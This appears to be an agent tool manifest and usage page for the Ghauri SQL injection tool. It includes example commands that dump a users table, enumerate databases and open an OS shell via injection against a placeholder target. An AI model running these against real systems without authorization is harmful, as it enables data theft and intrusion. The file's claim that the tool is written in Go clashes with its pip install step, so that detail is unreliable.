---
id: security-web-ghauri
namespace: security:web:ghauri
name: ghauri
description: Advanced SQL injection detection and exploitation tool written in Go
  with support for multiple DBMS and injection techniques.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - web.attack.sql-injection
  - web.vulnerability.scanner
  - web.exploit.database
  - web.enumeration.schema
  - web.enumeration.table
platforms:
  - linux
  - macos
  - cross-platform
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - sqlmap
  - commix
  - sqlninja
artifacts:
  - type: dump.json
    description: Dumped database contents as JSON
    mime: application/json
    trust_level: community
  - type: dump.csv
    description: Dumped database contents as CSV
    mime: text/csv
    trust_level: community
workflow_edges:
  produces:
    - database-schema
    - database-dump
    - sql-shell
    - os-shell
  consumes:
    - target-url
    - sqli-evidence
contract:
  inputs:
    - type: web.target.url
      description: Target URL with potential SQL injection point
    - type: web.target.data
      description: POST data for parameter injection
    - type: web.target.cookie
      description: Session cookies for authenticated injection
  outputs:
    - type: dump.json
      description: Extracted database contents
      mime: application/json
    - type: dump.csv
      description: Extracted database contents as CSV
      mime: text/csv
  side_effects:
    - network_traffic
    - network_traffic
    - filesystem_write
  resource_cost:
    cpu: medium
    memory_mb: 256
    network: medium
    disk_io: low
resource_profile:
  cpu: medium
  memory_mb: 256
  network: medium
  disk_io: low
allowed-tools:
  - ghauri
  - Bash
  - execFile
parameters:
  - name: url
    type: string
    required: true
    description: "Target URL with injection point"
    aliases:
      - -u
      - --url
  - name: data
    type: string
    required: false
    description: "POST data string for parameter injection"
    aliases:
      - --data
  - name: cookie
    type: string
    required: false
    description: "HTTP cookies for authenticated requests"
    aliases:
      - --cookie
  - name: random-agent
    type: boolean
    required: false
    description: "Use random User-Agent header"
    aliases:
      - --random-agent
  - name: level
    type: integer
    required: false
    description: "Injection depth level (1-5)"
    default_value: "1"
    aliases:
      - --level
  - name: risk
    type: integer
    required: false
    description: "Risk level (1-3, higher = more dangerous)"
    default_value: "1"
    aliases:
      - --risk
  - name: dbms
    type: string
    required: false
    description: "Force DBMS type (mysql, mssql, postgres, oracle, sqlite)"
    aliases:
      - --dbms
  - name: technique
    type: string
    required: false
    description: "Injection techniques to use (BEUSTQ)"
    aliases:
      - --technique
  - name: batch
    type: boolean
    required: false
    description: "Non-interactive mode, use default answers"
    aliases:
      - --batch
  - name: dump
    type: boolean
    required: false
    description: "Dump database table entries"
    aliases:
      - --dump
  - name: tables
    type: boolean
    required: false
    description: "Enumerate database tables"
    aliases:
      - --tables
  - name: columns
    type: boolean
    required: false
    description: "Enumerate table columns"
    aliases:
      - --columns
  - name: D
    type: string
    required: false
    description: "Specific database name to enumerate"
    aliases:
      - -D
      - --db
  - name: T
    type: string
    required: false
    description: "Specific table name to enumerate"
    aliases:
      - -T
      - --table
  - name: threads
    type: integer
    required: false
    description: "Number of concurrent threads"
    default_value: "1"
    aliases:
      - --threads
  - name: proxy
    type: string
    required: false
    description: "HTTP proxy address"
    aliases:
      - --proxy
  - name: headers
    type: string
    required: false
    description: "Additional HTTP headers"
    aliases:
      - --headers
  - name: timeout
    type: integer
    required: false
    description: "Request timeout in seconds"
    default_value: "30"
    aliases:
      - --timeout
  - name: os-shell
    type: boolean
    required: false
    description: "Prompt for an interactive OS shell"
    aliases:
      - --os-shell
  - name: sql-shell
    type: boolean
    required: false
    description: "Prompt for an interactive SQL shell"
    aliases:
      - --sql-shell
  - name: banner
    type: boolean
    required: false
    description: "Retrieve DBMS banner"
    aliases:
      - --banner
  - name: current-user
    type: boolean
    required: false
    description: "Retrieve current DBMS user"
    aliases:
      - --current-user
  - name: current-db
    type: boolean
    required: false
    description: "Retrieve current database name"
    aliases:
      - --current-db
  - name: dbs
    type: boolean
    required: false
    description: "Enumerate all databases"
    aliases:
      - --dbs
execution:
  template: "ghauri -u {target} --batch"
  sandbox: execFile
  timeout_seconds: 600
  shell: false
global_vars:
  target: url
examples:
  - description: "Basic SQL injection detection"
    command: ghauri -u "http://target.com/page?id=1" --batch
  - description: "Enumerate all databases"
    command: ghauri -u "http://target.com/page?id=1" --dbs --batch
  - description: "Dump a specific table"
    command: ghauri -u "http://target.com/page?id=1" -D mydb -T users --dump --batch
  - description: "OS shell via SQL injection"
    command: ghauri -u "http://target.com/page?id=1" --os-shell --batch
  - description: "POST injection with custom headers"
    command: 'ghauri -u "http://target.com/login" --data "user=admin&pass=test" --headers "X-Forwarded-For: 127.0.0.1"'
  - description: "High risk scan through proxy"
    command: ghauri -u "http://target.com/page?id=1" --level 3 --risk 3 --proxy http://127.0.0.1:8080 --batch
references:
  - label: "Ghauri GitHub"
    url: "https://github.com/r0eXpeR/ghauri"
  - label: "Ghauri documentation"
    url: "https://github.com/r0eXpeR/ghauri#readme"
phase: exploitation
techniques:
  - execution
  - execution
  - enumeration
items:
  - NoCreds
services: []
attack_types:
  - Exploitation
install:
    - method: pip
      package_name: "ghauri"
      commands:
        - "pip install ghauri"
---

# Ghauri — SQL Injection Detection and Exploitation Tool

Ghauri is an advanced SQL injection detection and exploitation tool written in Go, inspired by sqlmap. It supports multiple DBMS types and injection techniques including Boolean-based, error-based, time-based, UNION query, and stacked queries.

## Basic Usage

```bash
# Basic detection
ghauri -u "http://target.com/page?id=1" --batch

# Enumerate databases
ghauri -u "http://target.com/page?id=1" --dbs --batch

# Dump a specific table
ghauri -u "http://target.com/page?id=1" -D mydb -T users --dump --batch

# Interactive SQL shell
ghauri -u "http://target.com/page?id=1" --sql-shell
```

## Supported Techniques

| Technique | Flag | Description |
|-----------|------|-------------|
| Boolean | B | Boolean-based blind injection |
| Error | E | Error-based injection |
| Union | U | UNION query injection |
| Stacked | S | Stacked queries injection |
| Time | T | Time-based blind injection |
| Query | Q | Inline query injection |
